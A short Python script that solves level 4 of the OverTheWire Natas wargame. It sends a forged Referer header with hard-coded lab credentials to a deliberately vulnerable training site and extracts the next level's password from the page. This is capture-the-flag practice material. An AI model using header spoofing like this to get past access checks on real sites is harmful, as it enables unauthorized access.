import requests
import re
import sys

url = 'http://natas4.natas.labs.overthewire.org/index.php'
user ='natas4'
passwd ='Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'
headers = {'Referer' : 'http://natas5.natas.labs.overthewire.org/'}
s = requests.Session()
r = s.get(url,auth=(user,passwd),headers=headers)
print(s.cookies)
content = r.text
#print(content)
passwd = re.findall('The password for natas5 is (.*) ',content)[0]

print(passwd)

